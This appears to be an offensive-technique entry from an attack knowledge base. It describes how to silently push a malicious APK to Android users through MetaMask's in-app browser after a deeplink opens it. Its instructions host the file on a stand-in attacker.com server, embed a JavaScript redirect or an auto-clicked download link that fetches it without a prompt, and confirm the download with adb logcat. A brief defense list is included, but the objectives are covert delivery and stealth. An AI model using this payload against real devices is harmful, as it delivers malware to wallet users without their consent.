---
tags:
  - silent-download
  - webview-exploit
  - metamask
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Android
  - Mobile
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:24:44.902Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 51c4a86c-88e6-4e5f-a72e-f0f320a7b002
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Trigger-Silent-File-Download-in-MetaMask-Browser

## Summary

This procedure leverages the accessed in-app browser to initiate an automatic download of an attacker-controlled file, exploiting the lack of confirmation prompts in deeplink-triggered sessions.

## Description

Once the in-app browser is open via deeplink, the WebView component processes downloads without user interaction due to flawed business logic. Attackers host a malicious file (e.g., APK or script) on their server and trigger it via HTML/JS on the loaded page. This leads to immediate download initiation, as analyzed by UGWST. Targets are Android devices running MetaMask. Outcomes include file transfer to device storage undetected.

## Requirements

1. In-app browser already accessed via prior deeplink
2. Attacker server with downloadable malicious file (e.g., via HTTP)
3. No additional permissions beyond app's storage access

## Defense

Defensive measures and detection strategies:

- Enforce download confirmations in WebView configurations
- Audit network traffic for unexpected file downloads from apps
- Deploy endpoint detection to alert on anomalous app storage writes

## Objectives

1. Transfer malicious file to device without consent
2. Maintain stealth by avoiding UI prompts
3. Prepare for file execution or persistence

## Instructions

### Step 1: Host Malicious File

**Context**: Prepare the file on an attacker server for download.

Upload a file like `malicious.apk` to `https://attacker.com/downloads/malicious.apk`. Ensure it's accessible via direct link.

### Step 2: Embed Download Trigger in Page

**Context**: Load a page in the browser that auto-triggers the download.

The deeplink-opened page includes: `<script>window.location.href = 'https://attacker.com/downloads/malicious.apk';</script>` or a direct `<a href="https://attacker.com/downloads/malicious.apk" download id="dl">Download</a>` with JS click simulation. The browser fetches without prompt.

### Step 3: Monitor Download Initiation

**Context**: Confirm the download starts silently.

Use `adb logcat | grep DownloadManager` to watch for download events. Success shows file request in network traces.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- silent-download
- webview-exploit
- metamask
